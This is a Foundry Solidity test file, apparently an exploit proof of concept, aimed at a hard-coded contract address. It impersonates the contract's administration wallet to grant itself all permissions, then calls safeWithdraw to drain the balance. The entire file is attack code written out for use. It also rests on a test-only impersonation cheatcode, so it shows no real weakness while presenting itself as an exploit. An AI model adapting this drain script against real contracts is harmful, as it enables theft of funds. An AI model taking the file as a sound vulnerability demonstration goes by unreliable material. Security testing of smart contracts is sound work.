pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";

interface RightContract {
    function owner() external view returns (address);
    function safeWithdraw() external;
    function permissions(uint8, address) external view returns (bool);
    function administrationWallet() external view returns (address);
    function grantAllPermissions(address) external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0x99DE5611BC1f5b8e3D8876EF567b65f94C5a2ca3;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // First, ensure the contract has some BNB to drain
        deal(TARGET, 10 ether);

        // Label for clarity
        vm.label(TARGET, "RightContract");
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // Get administration wallet
        address adminWallet = RightContract(TARGET).administrationWallet();
        console.log("Admin wallet:", adminWallet);

        // Check if it has admin permission
        bool hasPermission = RightContract(TARGET).permissions(0, adminWallet);
        console.log("Has admin permission:", hasPermission);
        require(hasPermission, "Admin wallet doesn't have permission");

        // Impersonate admin wallet to grant ourselves permission
        vm.startPrank(adminWallet);
        RightContract(TARGET).grantAllPermissions(attacker);
        vm.stopPrank();

        // Verify we have permission
        bool weHavePermission = RightContract(TARGET).permissions(0, attacker);
        require(weHavePermission, "Failed to get permission");

        // Drain the contract
        RightContract(TARGET).safeWithdraw();

        console.log("Attacker balance:", attacker.balance);
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}

